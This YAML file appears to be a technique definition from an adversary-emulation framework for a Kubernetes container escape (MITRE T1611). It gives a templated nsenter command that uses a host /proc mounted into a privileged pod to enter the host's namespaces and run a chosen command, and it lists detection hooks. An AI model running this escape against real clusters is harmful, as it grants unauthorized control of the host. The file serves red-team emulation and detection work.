name: Escape container via NSenter and mounted host proc
description: Enter host namespaces through a host /proc filesystem mounted into the container.
tactic: "Privilege Escalation"
techniques: ["Escape to Host", T1611]
preconditions:
  kind: Pod
  "Pod.securityContext.privileged": true
  "Pod.hostPath": /proc
  accessLevel: "user-exec"
  linuxNamespaceAccess: [mount, uts, pid]
effects:
  - container.escape(sys)
parameters:
  HOST_PROC:
    type: string
    default: "${SRC.HOST_PATH:/proc}"
    description: in-container mount point of the host /proc filesystem
  TARGET:
    type: int
    default: 1
    description: the host PID whose namespaces to enter
  MOUNT:
    type: bool
    default: true
    description: enter the target process mount namespace
  UTS:
    type: bool
    default: true
    description: enter the target process UTS namespace
  IPC:
    type: bool
    default: false
    description: optionally enter the target process IPC namespace
  NET:
    type: bool
    default: false
    description: optionally enter the target process network namespace
  PID:
    type: bool
    default: true
    description: enter the target process PID namespace
  CMD:
    type: string
    default: hostname
    description: the command to execute on the host
procedures:
  - key: nsenter-host-proc
    tool: nsenter
    command: >-
      nsenter
      {% if MOUNT %}--mount={{ HOST_PROC | shell_quote }}/${TARGET}/ns/mnt{% endif %}
      {% if UTS %}--uts={{ HOST_PROC | shell_quote }}/${TARGET}/ns/uts{% endif %}
      {% if IPC %}--ipc={{ HOST_PROC | shell_quote }}/${TARGET}/ns/ipc{% endif %}
      {% if NET %}--net={{ HOST_PROC | shell_quote }}/${TARGET}/ns/net{% endif %}
      {% if PID %}--pid={{ HOST_PROC | shell_quote }}/${TARGET}/ns/pid{% endif %}
      ${CMD}
defend:
  - tactic: detect
    id: D3-SCA
    syscall: setns
  - tactic: detect
    id: D3-PSA
    process_creation: nsenter
references:
  - https://attack.mitre.org/techniques/T1611/
